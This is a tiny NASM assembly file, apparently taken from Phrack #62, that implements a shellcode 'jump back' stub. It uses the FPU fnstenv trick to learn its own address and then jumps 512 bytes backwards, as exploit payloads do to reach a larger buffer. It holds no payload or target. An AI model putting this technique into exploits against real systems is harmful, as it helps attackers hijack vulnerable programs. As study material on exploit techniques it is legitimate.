; filename: jmp.nasm
; author: Aaron Adams - from Phrack #62

global _start

section .text

_start: 
fldz
fnstenv [esp-12]
pop ecx
add cl, 10
nop

; Do the jump now. 
dec ch ; ecx -256
dec ch ; ecx -256
jmp ecx ; lets jmp ecx